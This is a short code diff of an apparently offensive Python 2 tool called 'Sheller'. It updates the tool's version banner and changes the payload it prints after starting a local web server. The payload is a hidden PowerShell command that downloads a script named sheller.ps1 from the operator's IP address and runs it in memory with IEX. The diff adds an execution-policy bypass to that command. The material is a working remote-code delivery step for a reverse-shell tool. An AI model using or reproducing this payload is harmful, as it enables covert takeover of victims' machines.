@@ -4,11 +4,11 @@ import subprocess
 
 def banner():
 	banner = '''
- ____  _          _ _                         ____    ___  
-/ ___|| |__   ___| | | ___ _ __    __   __   |___ \  / _ \ 
-\___ \| '_ \ / _ \ | |/ _ \ '__|___\ \ / /____ __) || | | |
- ___) | | | |  __/ | |  __/ | |_____\ V /_____/ __/ | |_| |
-|____/|_| |_|\___|_|_|\___|_|        \_/     |_____(_)___/ 
+ ____  _          _ _               ____    _ 
+/ ___|| |__   ___| | | ___ _ __    |___ \  / |
+\___ \| '_ \ / _ \ | |/ _ \ '__|____ __) | | |
+ ___) | | | |  __/ | |  __/ | |_____/ __/ _| |
+|____/|_| |_|\___|_|_|\___|_|      |_____(_)_|
 ============================================================
   By - Suraj Aggarwal ( M4TRIX_H4CK3R )\n
 	'''
@@ -97,7 +97,7 @@ $stream.Dispose()'''
 	cmd = subprocess.Popen(['python', '-m', 'SimpleHTTPServer', '10000'], stdout=subprocess.PIPE)
 	print '\033[1;32m[+]\033[1;m Server Started'
 	print '\033[1;32m[+]\033[1;m Payload:'
-	print "powershell -W Hidden IEX (New-Object Net.WebClient).DownloadString('http://{}:10000/sheller.ps1')".format(ip)
+	print "powershell -W Hidden -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://{}:10000/sheller.ps1')".format(ip)
 	return 0
 
 def unix():
